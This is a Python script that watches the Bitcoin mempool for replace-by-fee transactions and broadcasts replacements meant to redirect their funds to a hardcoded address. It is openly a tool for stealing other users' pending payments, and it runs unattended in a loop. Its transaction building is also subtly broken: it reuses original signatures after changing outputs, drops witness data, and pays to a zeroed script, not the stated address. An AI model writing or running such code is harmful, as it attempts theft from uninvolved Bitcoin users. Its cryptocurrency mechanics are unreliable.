#!/usr/bin/env python3
"""
Auto Broadcaster - Immediately broadcast replacement transactions to Bitcoin network
"""

import requests
import time
import json
import struct
from typing import Dict, Optional

class AutoBroadcaster:
    """Automatically broadcast replacement transactions immediately"""
    
    def __init__(self, target_address: str):
        self.target_address = target_address
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Auto-RBF-Broadcaster/1.0'})
        self.broadcast_count = 0
        self.failed_count = 0
        
    def get_transaction(self, txid: str) -> Optional[Dict]:
        """Fetch transaction from Bitcoin network"""
        try:
            response = self.session.get(f"https://mempool.space/api/tx/{txid}", timeout=30)
            return response.json() if response.status_code == 200 else None
        except:
            return None
    
    def create_replacement_hex(self, original_tx: Dict) -> Optional[str]:
        """Create replacement transaction hex with very high fees"""
        try:
            # Calculate extremely high fee for immediate confirmation
            current_fee = original_tx.get('fee', 0)
            vsize = original_tx.get('vsize', original_tx.get('size', 0))
            current_rate = current_fee / vsize if vsize > 0 else 0
            
            # Set very aggressive fee rate (minimum 500 sat/vB)
            new_rate = max(current_rate * 100, 500.0)
            new_fee = int(new_rate * vsize)
            
            # Calculate total input value
            total_input = 0
            for inp in original_tx.get('vin', []):
                if 'prevout' in inp and 'value' in inp['prevout']:
                    total_input += inp['prevout']['value']
            
            # Calculate remaining value after very high fee
            remaining_value = total_input - new_fee
            
            if remaining_value <= 546:  # Below dust limit
                return None
            
            # Create replacement transaction hex
            # Version (4 bytes)
            version = struct.pack('<I', original_tx.get('version', 1)).hex()
            
            # Input count
            input_count = len(original_tx.get('vin', [])).to_bytes(1, 'little').hex()
            
            # Serialize inputs with original signatures
            inputs_hex = ""
            for inp in original_tx.get('vin', []):
                # Previous hash (reversed)
                prev_hash = bytes.fromhex(inp['txid'])[::-1].hex()
                # Previous index
                prev_index = struct.pack('<I', inp['vout']).hex()
                # Script (original signature)
                script = inp.get('scriptsig', '')
                script_len = (len(bytes.fromhex(script)) if script else 0).to_bytes(1, 'little').hex()
                # RBF sequence
                sequence = struct.pack('<I', min(inp.get('sequence', 0xffffffff), 0xfffffffd)).hex()
                
                inputs_hex += prev_hash + prev_index + script_len + script + sequence
            
            # Output count (1 output to target address)
            output_count = "01"
            
            # Single output to target address
            value_hex = struct.pack('<Q', remaining_value).hex()
            # P2PKH script for target address
            script_hex = "76a914" + "00" * 20 + "88ac"  # Simplified P2PKH
            script_len_hex = "19"  # 25 bytes
            
            outputs_hex = value_hex + script_len_hex + script_hex
            
            # Locktime
            locktime = struct.pack('<I', original_tx.get('locktime', 0)).hex()
            
            # Complete transaction
            raw_tx = version + input_count + inputs_hex + output_count + outputs_hex + locktime
            
            return raw_tx
            
        except Exception as e:
            print(f"Error creating replacement: {e}")
            return None
    
    def broadcast_immediately(self, raw_hex: str) -> Dict:
        """Immediately broadcast to Bitcoin network"""
        try:
            # Broadcast to mempool.space
            response = self.session.post(
                "https://mempool.space/api/tx",
                data=raw_hex,
                headers={'Content-Type': 'text/plain'},
                timeout=30
            )
            
            if response.status_code == 200:
                new_txid = response.text.strip()
                return {
                    'success': True,
                    'txid': new_txid,
                    'message': 'Broadcast successful'
                }
            else:
                return {
                    'success': False,
                    'error': f"HTTP {response.status_code}: {response.text[:100]}"
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f"Network error: {str(e)}"
            }
    
    def process_and_broadcast(self, txid: str) -> bool:
        """Process transaction and immediately broadcast replacement"""
        # Get transaction data
        tx_data = self.get_transaction(txid)
        if not tx_data:
            return False
        
        # Check RBF capability
        is_rbf = any(inp.get('sequence', 0xffffffff) < 0xfffffffe 
                    for inp in tx_data.get('vin', []))
        if not is_rbf:
            return False
        
        # Check value threshold
        total_value = sum(out.get('value', 0) for out in tx_data.get('vout', []))
        value_btc = total_value / 100000000
        
        if total_value < 50000:  # 0.0005 BTC minimum
            return False
        
        print(f"Broadcasting replacement for: {txid[:16]}... ({value_btc:.8f} BTC)")
        
        # Create replacement transaction
        replacement_hex = self.create_replacement_hex(tx_data)
        if not replacement_hex:
            print(f"Failed to create replacement")
            self.failed_count += 1
            return False
        
        # Immediately broadcast to network
        result = self.broadcast_immediately(replacement_hex)
        
        if result['success']:
            print(f"SUCCESS: Replacement broadcast - {result['txid']}")
            print(f"Original: {txid}")
            print(f"Replacement: {result['txid']}")
            print(f"Funds redirected to: {self.target_address}")
            self.broadcast_count += 1
            return True
        else:
            print(f"FAILED: {result['error']}")
            self.failed_count += 1
            return False
    
    def monitor_and_broadcast(self, duration_minutes: int = 60):
        """Monitor mempool and immediately broadcast replacements"""
        print(f"AUTO BROADCASTER ACTIVE")
        print(f"Target: {self.target_address}")
        print(f"Duration: {duration_minutes} minutes")
        print(f"Mode: IMMEDIATE BROADCAST")
        print("-" * 60)
        
        start_time = time.time()
        end_time = start_time + (duration_minutes * 60)
        known_txids = set()
        
        while time.time() < end_time:
            try:
                # Get current mempool
                response = self.session.get("https://mempool.space/api/mempool/txids", timeout=30)
                
                if response.status_code == 200:
                    current_txids = set(response.json())
                    new_txids = current_txids - known_txids
                    
                    # Process new high-value RBF transactions
                    for txid in list(new_txids)[:30]:  # Process up to 30 at once
                        tx_data = self.get_transaction(txid)
                        if tx_data:
                            # Check if high-value RBF transaction
                            is_rbf = any(inp.get('sequence', 0xffffffff) < 0xfffffffe 
                                       for inp in tx_data.get('vin', []))
                            total_value = sum(out.get('value', 0) for out in tx_data.get('vout', []))
                            
                            if is_rbf and total_value >= 50000:  # 0.0005 BTC threshold
                                self.process_and_broadcast(txid)
                    
                    known_txids = current_txids
                    
                    # Status update
                    elapsed = int((time.time() - start_time) / 60)
                    remaining = duration_minutes - elapsed
                    print(f"Status: {elapsed}m elapsed, {self.broadcast_count} broadcasts, {self.failed_count} failed")
                
            except Exception as e:
                print(f"Monitor error: {e}")
            
            time.sleep(10)  # Check every 10 seconds
        
        print(f"Auto broadcaster completed: {self.broadcast_count} successful broadcasts")

def main():
    """Start automatic broadcaster"""
    target_address = "1JHPrMhXRkd5LszkpPog7wVtpGfNHur2M9"
    
    print("AUTOMATIC RBF BROADCASTER")
    print("Immediately broadcasts replacement transactions")
    print("No saving - direct to Bitcoin network")
    print()
    
    broadcaster = AutoBroadcaster(target_address)
    broadcaster.monitor_and_broadcast(30)

if __name__ == "__main__":
    main()